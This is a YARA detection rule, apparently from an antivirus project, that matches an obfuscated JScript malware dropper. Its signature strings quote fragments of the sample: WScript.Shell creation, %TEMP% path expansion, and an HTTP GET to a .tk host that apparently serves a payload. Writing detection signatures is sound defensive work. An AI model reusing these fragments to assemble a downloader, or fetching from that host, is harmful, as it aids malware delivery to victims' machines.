rule sig_20160427_83364eb29b3e7225c0a9e6df8f4bba20 {
  meta:
    description = "datamaliciousorder - file 20160427_83364eb29b3e7225c0a9e6df8f4bba20.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3c75f02d6198f542ab18bcae3c3ce5d0852bbfe798512c11dac6a9b255e7ee6f"

  strings:
    $s1  = "function KxwluIsjwh() {return RglceZxagk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"3R7Sshu" ascii
    $s2  = "function KxwluIsjwh() {return RglceZxagk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"3R7Sshu" ascii
    $s3  = "function HbyfgTnbvl(QjxmiMsyix, VoqplEhjsu){LhuguFwsmu = LhuguFwsmu * 1; return QjxmiMsyix - VoqplEhjsu;};" fullword ascii
    $s4  = "var RglceZxagk = function BojdwHlmsz() {return MkbdqQnrnb[GbbheFojoc](\"WScript\"+\".Shell\");}(), XzsjfTqegt = 11;" fullword ascii
    $s5  = "CmaebBbfwn[AnosuUogbj](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s6  = "var MkbdqQnrnb = this[\"WScript\"];" fullword ascii
    $s7  = "function LkynuFmxit(){return DhnugPhkyo + \"\";};" fullword ascii
    $s8  = "if (CmaebBbfwn[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function VbigiFzoyw() {return ((PlpxyRdfgy == true) && (PlpxyRdfgy == VtjskFsijh)) ? 1 : LhuguFwsmu;};" fullword ascii
    $s10 = "return HbyfgTnbvl(NlsjhXfiyi, TfxjhRdnhc);" fullword ascii
    $s11 = "function BatjkAxuxt(){return 23;};" fullword ascii
    $s12 = "var GxzznLtfyd = new this[\"D\"+\"ate\"]();" fullword ascii
    $s13 = "function IkpqwGigto(JdwfyAalfp) {var SlbxjRhyrr = (1, 2, 3, 4, 5, JdwfyAalfp); return SlbxjRhyrr;};" fullword ascii
    $s14 = "VtjskFsijh = true; " fullword ascii
    $s15 = "var VtjskFsijh = false;" fullword ascii
    $s16 = "HlkyjJieya = true;" fullword ascii
    $s17 = "function TtuetQllme()" fullword ascii
    $s18 = "function MrhigGholj(){return GbbheFojoc;};" fullword ascii
    $s19 = "}while (NyyqgStibg);" fullword ascii
    $s20 = "var HlkyjJieya = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}